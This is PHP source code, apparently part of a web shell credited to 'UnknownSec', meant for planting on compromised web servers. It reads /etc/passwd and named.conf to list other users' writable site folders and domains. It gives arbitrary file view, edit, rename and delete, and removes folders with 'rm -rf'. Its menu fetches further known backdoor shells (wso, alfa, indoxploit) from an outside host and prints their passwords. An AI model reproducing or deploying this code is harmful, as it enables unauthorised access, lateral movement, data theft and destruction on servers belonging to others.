			if($passwd == '' || !$etc) {
				echo "<rd>Can't read /etc/passwd</rd>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<cmd>R</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$user_jumping_dir\")'>$user_jumping_dir</a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<cmd>RW</cmd>] <a class='text-decoration-none' onclick='c(\"?dir=$user_jumping_dir\")'>$user_jumping_dir</a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <rd>can't get the domain name</rd> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Totally available $i from ip ".gethostbyname($_SERVER['HTTP_HOST']);
		}
		echo "</pre>";
	}
	echo "</div>
	</div>
<br/>";
}
//openfile
if(isset($nana['opn'])) {
	$file = $nana['opn'];
}	
// view
if($nana['action'] == 'view') {
s();
echo "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
</br>
<div class='bg-dark'>
	<div class='container-fluid language-javascript'>
		<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars(file_get_contents($file))."</textarea>
	</div>
</div>
<br>";
}
// edit
if(isset($nana['edit_file'])) {
	$updt = fopen("$file", "w");
	$hasil = fwrite($updt, $nana['isi']);		
	if ($hasil) {
echo '<strong>Edit file</strong> ok! '.alt_ok().'</div>';
	}else{
echo '<strong>Edit file</strong> fail! '.alt_fail().'</div>';
	}
}
if($nana['action'] == 'edit') {
s();
echo "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
</br>
<form action='?dir=$path&action=edit&opn=$file' method='POST'>
	<textarea class='form-control btn-sm' rows='10' name='isi'>".htmlspecialchars(file_get_contents($file))."</textarea>
	<br/>
	<button class='btn btn-outline-light btn-sm btn-block' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
</form>";
}
//rename folder
if($nana['action'] == 'rename_folder') {
	if($nana['r_d']) {
		$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($nana['r_d'])."");
		if($r_d) {
echo '<strong>Rename folder</strong> ok! '.alt_ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}else{
echo '<strong>Rename folder</strong> fail! '.alt_fail().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}
	}
s();
echo "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename_folder\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_folder\")'><i class='bi bi-trash-fill'></i></a>
</div>
<br>
	<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
</br>
<form action='?dir=$path&action=rename_folder' method='POST'>
<div class='input-group'>
	<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d'>
	<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
</div>
</form>";
}
//rename file
if(isset($nana['r_f'])) {
	$old = $file;
	$new = $nana['new_name'];
	rename($new, $old);
	if(file_exists($new)) {
echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
	<strong>Rename file</strong> name already in use! <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
</div>';
	}else{
if(rename($old, $new)) {
echo '<strong>Rename file</strong> ok! '.alt_ok().'</div>';
	}else{
echo '<strong>Rename file</strong> fail! '.alt_fail().'</div>';
		}
	}
}
if($nana['action'] == 'rename') {
s();
echo "
<div class='btn-group'>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$file\")'><i class='bi bi-eye-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$file\")'><i class='bi bi-pencil-square'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$file\")'><i class='bi bi-pencil-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$file\")'><i class='bi bi-trash-fill'></i></a>
	<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$file\")'><i class='bi bi-download'></i></a>
</div>
<br>
	<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
</br>
<form action='?dir=$path&action=rename&opn=$file' method='POST'>
<div class='input-group'>
	<input class='form-control btn-sm' type='text' name='new_name' value='".basename($file)."'>
	<button class='btn btn-outline-light btn-sm' type='sumbit' name='r_f'><i class='bi bi-arrow-return-right'></i></button>
</div>
</form>";
}
//delete file
if ($nana['action'] == 'delete_file') {
	$delete = unlink($file);
	if ($delete) {
echo '<strong>Delete file</strong> ok! '.alt_ok().'</div>';
	}else{
echo '<strong>Delete file</strong> fail! '.alt_fail().'</div>';
	}
}
//delete folder
if ($nana['action'] == 'delete_folder' ) {
	if(is_dir($dir)) {
	if(is_writable($dir)) {
		@rmdir($dir);
		@exe("rm -rf $dir");
		@exe("rmdir /s /q $dir");
echo '<strong>Delete folder</strong> ok! '.alt_ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		} else {
echo '<strong>Delete folder</strong> fail! '.alt_fail().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
		}
	}
}
echo '<div class="table-responsive">
<table class="table table-hover table-dark text-light">
<thead>
<tr>
	<td class="text-center">Name</td>
		<td class="text-center">Type</td>
		<td class="text-center">Last Edit</td>
		<td class="text-center">Size</td>
		<td class="text-center">Owner/Group</td>
		<td class="text-center">Perms</td>
	<td class="text-center">Action</td>
</tr>
</thead>
<tbody class="text-nowrap">';		
foreach($scand as $dir){
	$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
	if(strlen($dir) > 25) {
		$_d = substr($dir, 0, 25)."...";		
	}else{
		$_d = $dir;
	}
	if(function_exists('posix_getpwuid')) {
		$downer = @posix_getpwuid(fileowner("$path/$dir"));
		$downer = $downer['name'];
	} else {
		$downer = fileowner("$path/$dir");
	}
	if(function_exists('posix_getgrgid')) {
		$dgrp = @posix_getgrgid(filegroup("$path/$dir"));
		$dgrp = $dgrp['name'];
	} else {
		$dgrp = filegroup("$path/$dir");
	}
	if(!is_dir($path.'/'.$file)) continue;
		$size = filesize($path.'/'.$file)/1024;
		$size = round($size,3);
	if($size >= 1024){
		$size = round($size/1024,2).' MB';
	}else{
		$size = $size.' KB';
	}
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo "
<tr>
	<td><i class='bi bi-folder-fill'></i><a class='text-decoration-none text-secondary' onclick='c(\"?dir=$path/$dir\")'>$_d</a></td>
	<td class='text-center'>dir</td>
	<td class='text-center'>$dt</td>
	<td class='text-center'>-</td>
	<td class='text-center'>$downer<cmd>/</cmd>$dgrp</td>
	<td class='text-center'>";
		if(is_writable($path.'/'.$dir)) echo '<cmd>';
			elseif(!is_readable($path.'/'.$dir)) echo '<rd>';
		echo p($path.'/'.$dir);
		if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font></center></td>';
echo "
	<td class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path/$dir&action=rename_folder\")'><i class='bi bi-pencil-fill'></i></a><a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path/$dir&action=delete_folder\")'><i class='bi bi-trash-fill'></i></a>
	</div>
	</td>
</tr>";
}
foreach($scand as $file){
	$ft = date("Y-m-d G:i", filemtime("$path/$file"));
	if(function_exists('posix_getpwuid')) {
		$fowner = @posix_getpwuid(fileowner("$path/$file"));
		$fowner = $fowner['name'];
	} else {
		$fowner = fileowner("$path/$file");
	}
	if(function_exists('posix_getgrgid')) {
		$fgrp = @posix_getgrgid(filegroup("$path/$file"));
		$fgrp = $fgrp['name'];
	} else {
		$fgrp = filegroup("$path/$file");
	}
	if(!is_file($path.'/'.$file)) continue;
	if(strlen($file) > 25) {
		$_f = substr($file, 0, 25)."...-.".$ext;		
	}else{
		$_f = $file;
	}
echo "
<tr>
<td><i class='bi bi-file-earmark-text-fill'></i><a class='text-decoration-none text-secondary' onclick='c(\"?dir=$path&action=view&opn=$file\")'>$_f</a></td>
	<td class='text-center'>file</td>
	<td class='text-center'>$ft</td>
	<td class='text-center'>".sz(filesize($file))."</td>
	<td class='text-center'>$fowner<cmd>/</cmd>$fgrp</td>
	<td class='text-center'>";
	if(is_writable($path.'/'.$file)) echo '<cmd>';
	elseif(!is_readable($path.'/'.$file)) echo '<rd>';
		echo p($path.'/'.$file);
	if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font></td>';
echo "
	<td class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=view&opn=$path/$file\")'><i class='bi bi-eye-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=edit&opn=$path/$file\")'><i class='bi bi-pencil-square'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=rename&opn=$path/$file\")'><i class='bi bi-pencil-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=delete_file&opn=$path/$file\")'><i class='bi bi-trash-fill'></i></a>
		<a class='btn btn-outline-light btn-sm' onclick='c(\"?dir=$path&action=download&opn=$path/$file\")'><i class='bi bi-download'></i></a>
	</div>
	</td>
</tr>";
}
?>
</tbody>
</table>
</div>
<?php
switch ($nana['op'])
	{
case ('1'):
switch (true)
	{
case (op('adminer.php', 'https://random-php.ftp.sh/adminer.txt')):
	$ok = '<strong>adminer.php > </strong>ok! '.alt_ok().'</div>';
	}
	break;
case ('2'):
switch (true)
	{
case (op('alfa.php', 'https://random-php.ftp.sh/alfa.txt')):
	$ok = '<strong>alfa.php > </strong>ok! '.alt_ok().'</div>';
	}
	break;
case ('3'):
switch (true)
	{
case (op('indosec.php', 'https://random-php.ftp.sh/ids.txt')):
	$ok = '<strong>indosec.php > </strong>ok! '.alt_ok().'pass: IndoSec</div>';
	}
	break;
case ('4'):
switch (true)
	{
case (op('indoxploit-v2.php', 'https://random-php.ftp.sh/idx-v2.txt')):
	$ok = '<strong>indoxploit-v2.php > </strong>ok! '.alt_ok().'pass: IndoXploit</div>';
	}
	break;
case ('5'):
switch (true)
	{
case (op('indoxploit-v3.php', 'https://random-php.ftp.sh/idx-v3.txt')):
	$ok = '<strong>indoxploit-v3.php > </strong>ok! '.alt_ok().'pass: IndoXploit</div>';
	}
	break;
case ('6'):
switch (true)
	{
case (op('wso.php', 'https://random-php.ftp.sh/wso.txt')):
	$ok = '<strong>wso.php > </strong>ok! '.alt_ok().'pas: ghost287</div>';
	}
	break;
case ('7'):
switch (true)
	{
case (op('fox-wso.php', 'https://random-php.ftp.sh/fox-wso.txt')):
	$ok = '<strong>fox-wso.php > </strong>ok! '.alt_ok().'</div>';
	}
}
echo "$ok
<form action='?dir=$path' method='POST'>
<div class='input-group'>
	<select class='form-select form-select-sm' name='op'>
		<option selected disabled>select</option>
		<option value='1'>adminer</option>
		<option value='2'>alfa shell</option>
		<option value='3'>indosec shell</option>
		<option value='4'>indoxploit-v2 shell</option>
		<option value='5'>indoxploit-v3 shell</option>
		<option value='6'>wso shell</option>
		<option value='7'>fox wso shell</option>
	</select>
		<button class='btn btn-outline-light btn-sm'><i class='bi bi-arrow-return-right'></i></button>
	</form>
</div>
	<div class='text-secondary'>&copy; ".date('Y')." UnknownSec</div>";
?>
</div>
</div>
</div>
</body>
</html>
